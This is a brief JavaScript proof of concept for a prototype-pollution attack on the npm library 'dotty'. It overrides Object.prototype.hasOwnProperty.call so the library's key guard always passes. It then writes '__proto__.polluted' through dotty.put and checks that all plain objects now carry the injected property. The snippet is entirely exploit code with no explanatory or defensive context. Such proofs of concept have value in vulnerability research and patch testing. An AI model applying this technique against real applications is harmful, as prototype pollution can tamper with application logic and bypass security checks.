Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const dotty = require('dotty');
dotty.put({}, '__proto__.polluted', 'yes');
console.log({}.polluted);